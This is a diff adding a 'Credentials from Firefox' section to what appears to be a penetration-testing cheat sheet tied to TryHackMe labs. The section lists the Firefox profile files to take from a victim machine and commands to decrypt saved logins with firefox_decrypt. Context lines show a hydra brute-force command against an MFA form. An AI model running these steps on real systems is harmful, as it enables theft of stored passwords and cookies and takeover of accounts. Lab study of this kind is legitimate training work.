@@ -130,6 +130,32 @@ This example shows how to brute force a POST request. Check HackPark how to get 
 hydra -l $USERNAME -P output.txt $VICTIM http-post-form "/console/mfa.php:code=^PASS^:H=Cookie: PHPSESSID=hshqcs3n42r9qjs5b2850r9alt; user=jason_test_account; pwd=violet:F=Incorrect code" -T 64
 ```
 
+### **Credentials from Firefox**
+
+&#x20;**Examples**
+
+[gatekeeper.md](../../walkthroughs/tryhackme/gatekeeper.md "mention")
+
+From the victims machine. Transfer the following files back to Kali
+
+**Victim**
+
+```
+logins.json
+key4.db 
+cert9.db 
+cookies.sqlite
+```
+
+**Kali**
+
+```
+git clone https://github.com/unode/firefox_decrypt.git
+python3.9 firefox_decrypt.py ./
+```
+
+
+
 ## **SSH**
 
 ### Brute force SSH
